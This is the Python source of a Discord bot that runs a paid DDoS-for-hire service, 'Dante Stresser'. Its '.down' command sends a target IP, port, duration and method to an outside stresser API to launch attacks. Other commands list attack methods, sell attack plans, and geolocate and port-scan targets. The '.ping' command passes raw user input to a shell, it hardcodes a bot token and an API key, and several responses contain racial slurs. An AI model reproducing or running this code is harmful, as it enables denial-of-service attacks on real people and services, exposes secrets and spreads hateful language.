import discord
import requests
import json
import urllib.parse
import http.client
import urllib.request
from discord.ext import commands
import asyncio
import aiohttp
from random import choice
import random
import math
import urllib.parse
import re
import logging
import json
import os
import re
import io
import time
import json
import random
import discord
import asyncio
import datetime
import requests
import ctypes
import aiohttp
import colorama
import subprocess
import string
from discord import User
from discord.ext.commands import Bot, guild_only, cooldown, BadArgument, Cog, BucketType

msg = "Hey"
prefix="."
bot = commands.Bot(prefix, case_insenstive=True, fetch_offline_members=False)
token="Nzg3NjE0MjQ1ODUyMTUxODE4.X9Xg7Q.YgIyze5x99F9HI_2zVfPap6-1tU" #insert bot token

bot.remove_command('help')

@bot.event
async def on_ready():
  await bot.change_presence(activity=discord.Game(name='Do .help For Commands!, Powered By Dante Stresser Services'))
    
@bot.command()
@commands.has_role("Client")
@commands.cooldown(1, 1, commands.BucketType.user)
async def down(ctx, ip, port, time, method):
  api1=("http://relevantapi.xyz/stresser/api/api.php?key=UOyV4YdysGhxsvXH&host="+ip+'&port='+port+'&time='+time+'&method='+method)
  
  if int(time) <= 1200:
    t = requests.get(api1)
    
    embed = discord.Embed(
      title =(f"[+] Attack Has Been Sent [+]"),
      descripton = 'This is a description,',
      color = 0x000000
    )
    embed.add_field(name="**Target:**",value=(f"{ip}"),inline=True)
    embed.add_field(name="**Port:**",value=(f"{port}"),inline=False)
    embed.add_field(name="**Time:**",value=(f"{time}"),inline=False)
    embed.add_field(name="**Method:**",value=(f"{method}"),inline=False)
    embed.add_field(name="**Requester:**",value=(f"{ctx.author.mention}"),inline=False)
    embed.add_field(name="**Cooldown:**",value=(f"100 Sec Activated"),inline=False)
    embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/icons/781799044938858547/3efaaf0b3eeb9ad1c34592df0f03be77.webp?size=128")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
    await ctx.send(embed=embed)
  else:
    embed = discord.Embed(
      title = 'Your Plan Does Not Support Over 1200 Seconds',
      descripton = 'This is a description,',
      color = 0x000000
    )

    embed.set_image(url='https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif')
    embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
    await ctx.send(embed=embed)

@bot.command()
@commands.has_role("Client")
async def NLE(ctx):
  embed = discord.Embed(
    title =(f"NLE CHOPPA"),
    descripton =(f""),
    color = 0x000000
  )
  embed.set_image(url="https://cdn.discordapp.com/attachments/742652367740076074/746843702281895946/NastyRawKittiwake-max-1mb.gif")
  embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  await ctx.send(embed=embed)
  
@bot.command()
@commands.has_role("Client")
async def juice(ctx):
  embed = discord.Embed(
    title =(f"RIP Juice"),
    descripton =(f""),
    color = 0x000000
  )
  embed.set_image(url="https://cdn.discordapp.com/attachments/744372712012644415/745426944207880323/image0.gif")
  embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  await ctx.send(embed=embed)
  
@bot.command()
@commands.has_role("Client")
async def dad(ctx):
  embed = discord.Embed(
    title =(f"Niqqa Bye"),
    descripton =(f""),
    color = 0x000000
  )
  embed.set_image(url="https://cdn.discordapp.com/attachments/746393710845231156/746855403861573693/image0.gif")
  embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  await ctx.send(embed=embed)  

@bot.command()
@commands.has_role("Client")
async def PoloG(ctx):
  embed = discord.Embed(
    title =(f"POLO G"),
    descripton =(f""),
    color = 0x000000
  )
  embed.set_image(url="https://cdn.discordapp.com/attachments/742652367740076074/746841864556118216/d.gif")
  embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  await ctx.send(embed=embed)

@bot.command()
@commands.has_role("Client")
async def pscan(ctx,ip):
  url = "https://api.hackertarget.com/nmap/?q="+(ip)
  response = requests.get(url)
  rip = response.text
  embed = discord.Embed(title="**Port Scan Results**", description="%s"%(response.text), color=0x000000)
  embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  await ctx.send(embed=embed)

@bot.command()
async def methods(ctx):
    embed = discord.Embed(color=0xff0000, title="Max Time\nHomes: 1200 Seconds\nBypasses: 200 Seconds")
    embed.add_field(name="[+] TCP METHODS [+]", value="""```
SYN-ACK
RED-SYN
XSYN
XACK
```""", inline=True)
    embed.add_field(name="[+] UDP METHODS [+]", value="""```
TORRENT
SOURCE
DVR
ARD
```""", inline=True)
    embed.add_field(name="[+] AMP [+]", value="""```
IPSEC
SNMP
WSD
```""", inline=True)
    embed.add_field(name="[+] GAME METHODS [+]", value="""```
UNTURNED
FORTNITE
FREEFIRE
AMONGUS
ARKLIFT
ARK-255
R6S
ROBLOX
CSGO
PUBG
RUST
DVR
COD
CHOOPA
2K
```""", inline=True)
    embed.add_field(name="[+] Bypass Methods [+]", value="""```
TCP-BYPASS
UDP-BYPASS
VPN-UDSX
OVH-GAME
OVH-UDP
OVH-VSE
NFO-TCP
NFO-UDP
CHOOPA
HYDRA
```""", inline=True)
    embed.add_field(name="[+] WEBSITE METHODS [+]", value="""```
HTTP-GET
HTTP-BYPASS
HTTP-SPAM
AUTO-BYPASS
```""", inline=True)
    await ctx.send(embed=embed)
    
@bot.command()
async def tools(ctx):
    embed = discord.Embed(color=0xff0000, title="Methods")
    embed.add_field(name="[+] Lookup Command [+]", value="""```
.lookup (ip)
```""", inline=True)
    embed.add_field(name="[+] Port Scan An IP [+]", value="""```
.pscan (ip)
```""", inline=True)
    embed.add_field(name="[+] Ping Command [+]", value="""```
.ping (ip)
```""", inline=True)
    await ctx.send(embed=embed)
    
@bot.command()
async def extra(ctx):
    embed = discord.Embed(color=0xff0000, title="Methods")
    embed.add_field(name="Walter", value="""```
.walter
```""", inline=True)
    embed.add_field(name="NLE", value="""```
.NLE
```""", inline=True)
    embed.add_field(name="Polo G", value="""```
.PoloG
```""", inline=True)
    embed.add_field(name="DAD", value="""```
.dad
```""", inline=True)
    embed.add_field(name="8Ball", value="""```
.8ball (question)
```""", inline=True)
    embed.add_field(name="Joke", value="""```
.joke
```""", inline=True)
    embed.add_field(name="Say", value="""```
.say (word)
```""", inline=True)
    embed.add_field(name="Mr Shibs!!", value="""```
.mrshibs
```""", inline=True)
    embed.add_field(name="Number Guesser", value="""```
.guess (1-50)
```""", inline=True)
    embed.add_field(name="Bot Creator", value="""```
.creator
```""", inline=True)
    await ctx.send(embed=embed)

@bot.command()
async def plans(ctx):
    embed = discord.Embed(color=0xff0000, title="Methods")
    embed.add_field(name="[+] Plan [+]", value="""```
Monthly plan 1
Boot-Time: 1200s
Cooldown: 75s
Price: $10
.~~~~.
3 months
Boot-Time: 1200s
Cooldown: 75s
Price: $25
.~~~~.
Lifetime 
Boot-time: 1200s
Cooldown: 75s
price: $75
```""", inline=True)
    embed.add_field(name="[+]  Information [+]", value="""```
What We Take:
PayPal: 2% Fee
Cashapp: 0% Fee
BTC: 0%$ Fee
```""", inline=True)
    await ctx.send(embed=embed)
    
@bot.command()
async def tos(ctx):
    embed = discord.Embed(color=0xff0000, title="Methods")
    embed.add_field(name="[+] Make Sure To Follow The TOS To Prevent From Getting Banned [+]", value="""```
[+] Dante Stresser Terms Of Service [+]

This service is for strictly testing

What I do with this tool is my responsibility

This service is only provided to better understand these methods

This service is only provided to learn about each and every method

Developers use this service to protect their servers from future stresses

There Will Be No Refunds After Buying The Service.

Server TOS: 
https://discord.com/terms
```""", inline=True)
    await ctx.send(embed=embed)
    
@bot.command()
async def help(ctx):
    embed = discord.Embed(color=0xff0000, title="Commands For Dante")
    embed.add_field(name="Attack Command", value="""```
.attacks
```""", inline=True)
    embed.add_field(name="Method Command", value="""```
.methods
```""", inline=True)
    embed.add_field(name="Tools Command", value="""```
.tools
```""", inline=True)
    embed.add_field(name="TOS Command", value="""```
.tos
```""", inline=True)
    embed.add_field(name="Extra Command", value="""```
.extra
```""", inline=True)
    embed.add_field(name="Power Provider:", value="""```
RelevantAPI <- FUCKING GODLY
```""", inline=True)
    embed.set_image(url='')
    embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
    await ctx.send(embed=embed)
    
@bot.command()
async def attacks(ctx):
    embed = discord.Embed(color=0xff0000, title="Commands For OPUS")
    embed.add_field(name="[+] Launching Attacks [+]", value="""```
.down (ip) (port) (time) (method) | [Gold Plan]

Example: 
.down 74.74.74.73 80 300 NTP
```""", inline=True)
    await ctx.send(embed=embed)

@bot.command()
@commands.has_role("Potential Clients")
async def ping(ctx,ip):
  await ctx.send(f"{ctx.author.mention} Getting results for **{ip}**")
  hostname = (ip) 
  response = os.system("ping -c 1 " + hostname)
  if response == 0:
    embed = discord.Embed(  
      title =(f"The Listed IP **{ip}** Is Online"),
      descripton =(f"#down (ip) (port) (time) (method)"),
      color = 0x000000
    )
    embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")    
    await ctx.send(embed=embed)
  else:
    embed = discord.Embed(  
      title =(f"The Listed IP **{ip}** Is Offline\n\nTarget Still Online?\nMight be because they have ICMP turned Off!"),
      descripton =(f""),
      color = 0x000000
    )
    embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")    
    await ctx.send(embed=embed)
    
@bot.command()
@commands.has_role("Client")
async def say(ctx, *, arg):
    await ctx.message.delete()
    await ctx.send(arg)

@bot.command()
@commands.has_role("Client")
async def lookup(ctx, ip):
  url = ("http://ip-api.com/json/"+(ip)+"?fields=country,regionName,city,zip,isp,org,query,proxy,mobile,continent")
  response = requests.get(url)
  test = response.json()
  country = test["country"]
  regionName = test["regionName"]
  city = test["city"]
  isp = test["isp"]
  org = test["org"]
  proxy = test["proxy"]
  mobile = test["mobile"]  
  zipcode = test["zip"]
  continent = test["continent"]
  
  embed = discord.Embed(
    title =(f"Lookup on {ip}"),
    color = 0x000000
  )
  
  embed.add_field(name="**Country:**",value=(f"{country}"),inline=False)
  embed.add_field(name="**RegionName:**",value=(f"{regionName}"),inline=False)
  embed.add_field(name="**City:**",value=(f"{city}"),inline=False)
  embed.add_field(name="**ISP:**",value=(f"{isp}"),inline=False)
  embed.add_field(name="**Vpn/Proxy:**",value=(f"{proxy}"),inline=False)
  embed.add_field(name="**Hotspot:**",value=(f"{mobile}"),inline=False)
  embed.add_field(name="**Zip:**",value=(f"{zipcode}"),inline=False)
  embed.add_field(name="**Continent:**",value=(f"{continent}"),inline=False)
  embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  await ctx.send(embed=embed)

@bot.command()
@commands.has_role("Client")
async def joke(ctx):
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@bot.command()
@commands.has_role("Client")
async def walter(ctx):
  embed = discord.Embed(
    title =(f"Get To Slaming Skids Niqqa"),
    descripton =(f""),
    color = 0x000000
  )
  embed.set_image(url="https://cdn.discordapp.com/attachments/745301498002407495/745311616022609962/image0.gif")
  embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  await ctx.send(embed=embed)
  
@bot.command()
@commands.has_role("Client")
async def creator(ctx):
  embed = discord.Embed(
    title =(f"Creator of this Bot is VxZod"),
    descripton =(f""),
    color = 0x000000
  )
  embed.set_image(url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  embed.set_footer(text="Mr Zod", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  await ctx.send(embed=embed)

@bot.command()
@commands.has_role("Client")
async def mrshibs(ctx):
  embed = discord.Embed(
    title =(f"Look at him swing!!"),
    descripton =(f""),
    color = 0x000000
  )
  embed.set_image(url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  embed.set_footer(text="Dante Stresser", icon_url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
  await ctx.send(embed=embed)

@bot.command(name='8ball')
@commands.has_role("Client")
async def _ball(ctx, *, question):
    await ctx.message.delete()
    responses = [
      'That is a resounding no',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
      'Maybe',
      'There is a good chance',
      'Fuck That, Dont You Just Hate Niggers'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)
    
@bot.command(name='guess')
@commands.has_role("Client")
async def guess(ctx, *, question):
    await ctx.message.delete()
    responses = [
      '1',
      '2',
      '3',
      '4',
      '5',
      '6',
      '7',
      '8',
      '8',
      '9',
      '10',
      '11',
      '12',
      '13',
      '14',
      '15',
      '16',
      '17',
      '18',
      '19',
      '20',
      '21',
      '22',
      '23',
      '24',
      '25',
      '26',
      '27',
      '28',
      '29',
      '30',
      '30',
      '31',
      '32',
      '33',
      '34',
      '35',
      '36',
      '37',
      '38',
      '39',
      '40',
      '41',
      '42',
      '43',
      '44',
      '45',
      '46',
      '47',
      '48',
      '49',
      '50',
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Your Guess", value=question, inline=False)
    embed.add_field(name="Was I right? If not try again!", value=answer, inline=False)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/787630091839733760/787635010630320138/mrshibs.gif")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)
@down.error
async def down_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        msg = 'You Are On Cool-Down, Try Again In {:.2f}s'.format(error.retry_after)
        
        embed = discord.Embed(
        color = 0x000000
        )
        
        embed.add_field(name="**ALERT**",value=(f"{msg}"),inline=False)
        
        await ctx.send(embed=embed)
    else:
        raise error
        
        
bot.run(token)